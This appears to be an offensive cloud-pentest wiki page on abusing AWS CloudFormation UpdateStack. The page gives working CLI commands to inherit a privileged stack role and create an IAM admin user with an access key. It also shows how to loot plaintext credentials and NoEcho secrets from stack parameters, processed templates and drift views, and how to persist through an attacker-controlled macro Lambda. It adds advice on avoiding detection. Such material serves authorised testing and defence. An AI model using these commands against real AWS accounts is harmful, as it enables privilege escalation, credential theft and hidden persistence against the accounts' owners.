---
title: "UpdateStack: change a stack that runs a privileged stack role"
description: "cloudformation:UpdateStack to change a stack that runs with a privileged stack role and provision attacker-controlled resources."
keywords:
  - UpdateStack
  - CloudFormation
  - stack role
  - deployment
  - resource
---

# UpdateStack

A deployed CloudFormation stack may have been created with a **stack role** more privileged than you. `cloudformation:UpdateStack` reuses that stored role by default, so submitting a modified template provisions whatever the role can create, including IAM principals, with no `PassRole` of your own.

## Update with the stored role

```bash
# fetch the current template, add an admin user or policy attachment, resubmit
aws cloudformation get-template --stack-name <stack> --query TemplateBody > t.json
# edit t.json to add e.g. an AWS::IAM::User with an access key
aws cloudformation update-stack --stack-name <stack> \
  --template-body file://t.json --capabilities CAPABILITY_NAMED_IAM
```

## Loot secrets from stacks and templates

Before changing anything, read the existing stacks: parameters and outputs routinely hold plaintext credentials, and `NoEcho` only masks a parameter in the console, not in the template or the drift view.

```bash
aws cloudformation describe-stacks --query 'Stacks[].{N:StackName,P:Parameters,O:Outputs}'
aws cloudformation get-template --stack-name <stack> --template-stage Processed
# recover a NoEcho parameter value from the processed/rendered resources or a drift diff
aws cloudformation detect-stack-drift --stack-name <stack>
aws cloudformation describe-stack-resource-drifts --stack-name <stack>
```

## Persist with a macro

A CloudFormation **macro** is a Lambda that CloudFormation invokes to transform templates. Registering a macro (or pointing an existing one at a function you control) means every future stack operation that references it runs your Lambda inside the deploy pipeline, a durable foothold that looks like normal infrastructure.

```bash
aws cloudformation create-stack --stack-name m --template-body file://macro.yaml \
  --capabilities CAPABILITY_IAM   # macro.yaml defines AWS::CloudFormation::Macro -> your Lambda
```

## Exploitation notes

- The stack reuses its existing role unless you pass a different `--role-arn`, so you inherit its privileges for free.
- Keep the rest of the template intact to avoid destroying resources and drawing attention; add, do not replace.
- Stack outputs can surface the created key directly.

## Tools

- **AWS CLI** (`cloudformation get-template` / `update-stack`).
- **Pacu**: CloudFormation modules.

## References

- [Rhino Security Labs: AWS privilege escalation (UpdateStack)](https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/)
- [BishopFox: iam-vulnerable](https://github.com/BishopFox/iam-vulnerable)
- [Pacu (Rhino Security Labs)](https://github.com/RhinoSecurityLabs/pacu)
- [Hacking the Cloud: AWS](https://hackingthe.cloud/)
